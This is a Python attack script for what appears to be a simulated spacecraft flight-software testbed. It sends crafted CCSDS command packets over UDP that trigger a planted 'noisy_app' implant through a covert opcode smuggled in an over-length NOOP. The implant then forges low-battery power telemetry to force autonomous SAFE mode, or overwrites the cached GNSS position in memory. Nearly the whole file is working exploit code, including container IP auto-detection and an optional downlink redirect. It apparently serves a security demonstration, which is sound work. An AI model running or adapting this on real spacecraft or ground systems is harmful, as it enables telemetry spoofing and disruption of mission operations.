#!/usr/bin/env python3
"""
attack_eps_piggyback.py - supply-chain "piggyback" EPS-spoof scenario.

How the attack works
--------------------
A co-resident malicious noisy_app subscribes to CI_LAB's legitimate NOOP
carrier (MID 0x18E0). cFE SB delivers every message to ALL subscribers with no
sender authentication, so noisy_app observes the carrier. An over-length NOOP
carries a covert opcode in its trailing byte:
  0x00 DORMANT      - clear a running override / spoof
  0x02 EPS_SPOOF    - forge ONE low-battery EPS HK packet (one-shot)
  0x06 EPS_OVERRIDE - persistent: shadow every genuine EPS HK (default)
  0x0C GNSS_SPOOF   - persistent: directly OVERWRITE the GNSS app's cached
                      position in memory (blatant teleport to Null Island 0,0).
                      This NEVER touches the Software Bus. Clear with 0x00.
  0x0E GNSS_DRIFT   - persistent: same direct-memory vector as 0x0C, but a slow
                      plausible drift (genuine position + a growing offset) that
                      stays orbit-shaped, so only a truth-vs-bus divergence check
                      (not a range check) catches it. Clear with 0x00. See
                      docs/security/gnss-mem-overwrite-analysis.md.

noisy_app then publishes a forged GENERIC_EPS_HK_TLM (MID 0x091A) with
BatteryVoltage = 10000 mV (< LC watchpoint WP0 threshold 14800 mV). Because SB
is last-writer-wins, that forged value is what LC samples -> ADT#0
(MaxFailsBeforeRTS=3) -> RTS1 (autonomous SAFE mode). Opcode 0x06 shadows every
real EPS HK, so WP0 stays FAILED and SAFE latches reliably.

Usage:
    python3 attack_eps_piggyback.py [OPTIONS]

Options:
    --host        CI_LAB uplink host (default: 127.0.0.1)
    --port        CI_LAB uplink UDP port (default: 5012)
    --opcode      covert opcode byte (default: 0x06 EPS_OVERRIDE; also accepts
                  0x02 spoof, 0x00 dormant/off)
    --rearm       send LC SET_AP_STATE (AP0 -> ACTIVE) first (only needed if a
                  prior run disabled the actionpoint; a fresh boot has it active)
    --downlink    send TO_LAB OUTPUT_ENABLE first (only needed if the launch did
                  not already self-resolve the downlink destination)
    --dest-ip     TO_LAB downlink destination for --downlink (default: 10.0.2.2,
                  the QEMU slirp host alias used by the RTEMS launch)
"""

import argparse
import socket
import struct
import subprocess
import sys
import time

# Carrier / target MIDs (CCSDS APIDs already carry the cmd type + sec-hdr bits).
CI_LAB_CMD_MID    = 0x18E0   # carrier the noisy_app sniffer subscribes to
TO_LAB_CMD_MID    = 0x18E8   # routed by SB to TO_LAB (OUTPUT_ENABLE)
LC_CMD_MID        = 0x18A4   # LC_CMD_MID (SET_AP_STATE re-arm)
NOISY_APP_CMD_MID = 0x18F2   # the implant's OWN command MID (noisy_app_msgids.h)
NOOP_FC           = 0x00     # CI_LAB_NOOP_CC / CARRIER_NOOP_FC

OPCODES = {
    "0x00": 0x00, "off": 0x00, "dormant": 0x00,
    "0x02": 0x02, "spoof": 0x02,
    "0x06": 0x06, "override": 0x06,
    "0x0c": 0x0C, "gnss": 0x0C, "gnss_spoof": 0x0C,
    "0x0e": 0x0E, "gnss_drift": 0x0E, "drift": 0x0E,
}


def stamp(msg: str) -> None:
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def ccsds(stream_id: int, payload: bytes) -> bytes:
    """6-byte CCSDS primary header (StreamID, Sequence, Length) + data field.

    CCSDS length = octets_in_data_field - 1 = total_packet_bytes - 7.
    `payload` is the secondary command header (FC + checksum) plus any trailing
    bytes (the covert opcode for a piggyback NOOP).
    """
    length = len(payload) - 1
    return struct.pack(">HHH", stream_id, 0xC000, length) + payload


def noop(opcode=None) -> bytes:
    """8-byte control NOOP, or 9-byte piggyback NOOP carrying a trailing opcode."""
    sec = struct.pack(">BB", NOOP_FC, 0x00)  # function code + checksum
    if opcode is not None:
        sec += struct.pack(">B", opcode)     # the smuggled covert byte
    return ccsds(CI_LAB_CMD_MID, sec)


def noisy_direct(opcode: int) -> bytes:
    """Direct command to the implant's OWN command MID (0x18F2), carrying the
    covert opcode as a trailing byte. noisy_app's main loop treats any command
    on NOISY_APP_CMD_MID with bytes beyond the 8-byte command header as an
    opcode (the is_own_cmd path), so this triggers the scenario WITHOUT the
    CI_LAB carrier sniff. The GNSS memory overwrite it then performs is
    invisible to the Software Bus."""
    sec = struct.pack(">BB", 0x00, 0x00) + struct.pack(">B", opcode)
    return ccsds(NOISY_APP_CMD_MID, sec)


def to_lab_enable(dest_ip: str) -> bytes:
    ip = dest_ip.encode("ascii")[:20].ljust(20, b"\x00")
    sec = struct.pack(">BB", 0x02, 0x00) + ip  # TO_LAB_OUTPUT_ENABLE_CC = 2
    return ccsds(TO_LAB_CMD_MID, sec)


def lc_set_ap0_active() -> bytes:
    """LC SET_AP_STATE: AP0 -> ACTIVE (FC 3; payload APNumber=0, NewAPState=1)."""
    sec = struct.pack(">BB", 0x03, 0x00) + struct.pack("<HH", 0, 1)
    return ccsds(LC_CMD_MID, sec)


def resolve_fsw_host() -> str:
    """Resolve the FSW uplink endpoint.

    For the RTEMS containerized launch, CI_LAB's 5012 is a QEMU hostfwd inside
    the FSW container and that port is NOT published to the host, so the docker
    host must target the FSW container's network IP directly (the same way the
    COSMOS DEBUG interface reaches nos-fsw:5012). Auto-detect that IP from the
    running FSW container; fall back to 127.0.0.1 (e.g. a Linux/native FSW or a
    published port).
    """
    for name in ("sc01-nos-fsw", "nos-fsw"):
        try:
            out = subprocess.run(
                ["docker", "inspect", "-f",
                 "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", name],
                capture_output=True, text=True, timeout=10)
            ip = out.stdout.strip()
            if out.returncode == 0 and ip:
                return ip
        except (OSError, subprocess.SubprocessError):
            break
    return "127.0.0.1"


def parse_opcode(raw: str) -> int:
    key = raw.strip().lower()
    if key in OPCODES:
        return OPCODES[key]
    try:
        return int(key, 0) & 0xFF
    except ValueError:
        sys.exit(f"invalid --opcode {raw!r}; use one of {sorted(OPCODES)} or a byte value")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Piggyback EPS-spoof supply-chain scenario")
    parser.add_argument("--host",    default=None, help="CI_LAB uplink host (default: auto-detect FSW container IP, else 127.0.0.1)")
    parser.add_argument("--port",    type=int, default=5012, help="CI_LAB uplink UDP port (default: 5012)")
    parser.add_argument("--opcode",  default="0x06",
                        help="covert opcode (default: 0x06 EPS_OVERRIDE; also 0x02/0x00/0x0C gnss/0x0E gnss_drift)")
    parser.add_argument("--rearm",   action="store_true", help="send LC SET_AP_STATE (AP0 ACTIVE) first")
    parser.add_argument("--downlink", action="store_true", help="send TO_LAB OUTPUT_ENABLE first")
    parser.add_argument("--dest-ip", default="10.0.2.2", help="TO_LAB downlink dest for --downlink (default: 10.0.2.2)")
    parser.add_argument("--direct", action="store_true",
                        help="trigger via a DIRECT command to NOISY_APP_CMD_MID (0x18F2) instead of the "
                             "CI_LAB carrier sniff (the GNSS_SPOOF scenario).")
    args = parser.parse_args()

    opcode = parse_opcode(args.opcode)
    host = args.host or resolve_fsw_host()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (host, args.port)

    stamp(f"piggyback EPS-spoof -> {host}:{args.port}  carrier MID 0x{CI_LAB_CMD_MID:04X}  opcode 0x{opcode:02X}")

    if args.downlink:
        stamp(f"TO_LAB OUTPUT_ENABLE (dest {args.dest_ip}:5013)")
        sock.sendto(to_lab_enable(args.dest_ip), target)
        time.sleep(2)

    if args.rearm:
        stamp("LC SET_AP_STATE: AP0 -> ACTIVE (re-arm)")
        sock.sendto(lc_set_ap0_active(), target)
        time.sleep(0.5)

    if args.direct:
        # Direct command to the implant's own MID. No carrier sniff involved;
        # the GNSS memory overwrite the implant then performs never touches the
        # bus.
        stamp(f"DIRECT command -> NOISY_APP_CMD_MID 0x{NOISY_APP_CMD_MID:04X}  opcode 0x{opcode:02X}")
        sock.sendto(noisy_direct(opcode), target)
    else:
        # Baseline control NOOP: header-only, so the sniffer stays silent and
        # the carrier behaves normally (gives the dashboards a clean "before").
        stamp("control NOOP (8 bytes) - expect noisy_app silent")
        sock.sendto(noop(), target)
        time.sleep(3)

        # The piggyback NOOP: over-length, trailing byte = covert opcode.
        stamp(f"piggyback NOOP (9 bytes) - opcode 0x{opcode:02X}")
        sock.sendto(noop(opcode), target)

    sock.close()
    stamp("Sent. Inspect: noisy_app EVS, LC WP0/AP0 + spacecraft mode (SAFE vs NOMINAL).")


if __name__ == "__main__":
    main()
